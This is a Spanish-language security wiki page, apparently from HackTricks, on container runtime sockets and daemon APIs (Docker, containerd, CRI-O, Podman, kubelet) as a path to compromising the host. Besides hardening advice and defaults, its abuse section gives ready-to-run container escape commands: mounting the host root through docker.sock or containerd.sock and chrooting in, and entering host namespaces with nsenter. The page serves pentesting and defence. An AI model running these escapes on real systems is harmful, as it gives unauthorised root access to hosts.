# API de Runtime y Exposición del Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Resumen

Muchas compromisos reales de contenedores no comienzan en absoluto con un namespace escape. Comienzan con acceso al plano de control del runtime. Si una carga de trabajo puede comunicarse con `dockerd`, `containerd`, CRI-O, Podman, o kubelet a través de un Unix socket montado o un listener TCP expuesto, el atacante puede ser capaz de solicitar un nuevo contenedor con mayores privilegios, montar el sistema de archivos del host, unirse a los namespaces del host, o recuperar información sensible del nodo. En esos casos, la API del runtime es la verdadera frontera de seguridad, y comprometerla es funcionalmente cercano a comprometer el host.

Por eso la exposición del socket del runtime debería documentarse por separado de las protecciones del kernel. Un contenedor con seccomp, capabilities y MAC confinement ordinarios aún puede estar a una llamada de API de comprometer el host si `/var/run/docker.sock` o `/run/containerd/containerd.sock` está montado dentro de él. El aislamiento del kernel del contenedor actual puede estar funcionando exactamente como se diseñó mientras el plano de gestión del runtime permanece totalmente expuesto.

## Modelos de acceso al daemon

Docker Engine tradicionalmente expone su API privilegiada a través del Unix socket local en `unix:///var/run/docker.sock`. Históricamente también se ha expuesto de forma remota mediante listeners TCP como `tcp://0.0.0.0:2375` o un listener protegido por TLS en `2376`. Exponer el daemon de forma remota sin TLS fuerte y autenticación de cliente equivale a convertir la API de Docker en una interfaz de root remota.

`containerd`, CRI-O, Podman, y kubelet exponen superficies de alto impacto similares. Los nombres y flujos de trabajo difieren, pero la lógica no. Si la interfaz permite al llamante crear workloads, montar rutas del host, recuperar credenciales o alterar contenedores en ejecución, la interfaz es un canal de gestión privilegiado y debe tratarse como tal.

Rutas locales comunes que vale la pena comprobar son:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.

## Acceso remoto seguro

Si un daemon debe exponerse más allá del socket local, la conexión debe protegerse con TLS y, preferiblemente, con autenticación mutua, de modo que el daemon verifique al cliente y el cliente verifique al daemon. La antigua costumbre de abrir el Docker daemon en HTTP sin cifrar por conveniencia es uno de los errores más peligrosos en la administración de container, porque la superficie de la API es lo suficientemente potente como para crear containers privilegiados directamente.

El patrón histórico de configuración de Docker se veía así:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
En hosts basados en systemd, la comunicación del daemon también puede aparecer como `fd://`, lo que significa que el proceso hereda un socket ya abierto por systemd en lugar de enlazarlo directamente. La lección importante no es la sintaxis exacta sino la consecuencia en seguridad. En el momento en que el daemon escucha más allá de un socket local con permisos estrictos, la seguridad del transporte y la autenticación de clientes se vuelven obligatorias en lugar de ser un hardening opcional.

## Abuso

Si hay un socket de runtime presente, confirma cuál es, si existe un cliente compatible, y si el acceso HTTP bruto o gRPC es posible:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Estos comandos son útiles porque distinguen entre una ruta muerta, un socket montado pero inaccesible, y una API privilegiada en funcionamiento. Si el cliente tiene éxito, la siguiente pregunta es si la API puede lanzar un nuevo container con un host bind mount o host namespace sharing.

### Ejemplo completo: Docker Socket To Host Root

Si `docker.sock` es accesible, el escape clásico es iniciar un nuevo container que monte el sistema de archivos raíz del host y luego hacer `chroot` dentro de él:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Esto proporciona ejecución directa como root en el host a través del Docker daemon. El impacto no se limita a lecturas de archivos. Una vez dentro del nuevo container, el atacante puede alterar archivos del host, obtener credenciales, implantar persistencia o iniciar cargas de trabajo adicionales con privilegios.

### Full Example: Docker Socket To Host Namespaces

Si el atacante prefiere entrada a namespaces en lugar de acceso filesystem-only:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Este camino alcanza el host solicitando al runtime que cree un nuevo contenedor con exposición explícita del host-namespace en lugar de explotar el actual.

### Ejemplo completo: containerd Socket

Un socket montado de `containerd` suele ser igual de peligroso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
El impacto, nuevamente, es el compromiso del host. Incluso si las herramientas específicas de Docker están ausentes, otra API del runtime aún puede ofrecer los mismos privilegios administrativos.

## Checks

El objetivo de estas comprobaciones es responder si el contenedor puede alcanzar cualquier plano de gestión que debería haber permanecido fuera del perímetro de confianza.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Lo interesante aquí:

- Un socket de runtime montado suele ser un primitivo administrativo directo en lugar de una mera divulgación de información.
- Un listener TCP en `2375` sin TLS debe considerarse una condición de compromiso remoto.
- Variables de entorno como `DOCKER_HOST` a menudo revelan que la carga de trabajo fue diseñada intencionalmente para comunicarse con el runtime del host.

## Valores predeterminados del runtime

| Runtime / platform | Estado predeterminado | Comportamiento predeterminado | Debilitamientos manuales comunes |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local por defecto | `dockerd` escucha en el socket local y el daemon suele ejecutarse como root | montar `/var/run/docker.sock`, exponer `tcp://...:2375`, TLS débil o ausente en `2376` |
| Podman | CLI sin daemon por defecto | No se requiere un daemon privilegiado de larga duración para el uso local ordinario; los sockets de API aún pueden exponerse cuando se habilita `podman system service` | exponer `podman.sock`, ejecutar el servicio de forma amplia, uso de la API con privilegios de root |
| containerd | Socket local privilegiado | API administrativa expuesta a través del socket local y generalmente consumida por herramientas de más alto nivel | montar `containerd.sock`, acceso amplio a `ctr` o `nerdctl`, exponer namespaces privilegiados |
| CRI-O | Socket local privilegiado | El endpoint CRI está destinado a componentes de confianza a nivel de nodo local | montar `crio.sock`, exponer el endpoint CRI a cargas de trabajo no confiables |
| Kubernetes kubelet | API de gestión a nivel de nodo local | El Kubelet no debería ser ampliamente accesible desde Pods; el acceso puede exponer el estado de los pods, credenciales y funciones de ejecución dependiendo de authn/authz | montar sockets o certs del kubelet, autenticación débil del kubelet, networking del host y un endpoint de kubelet alcanzable |
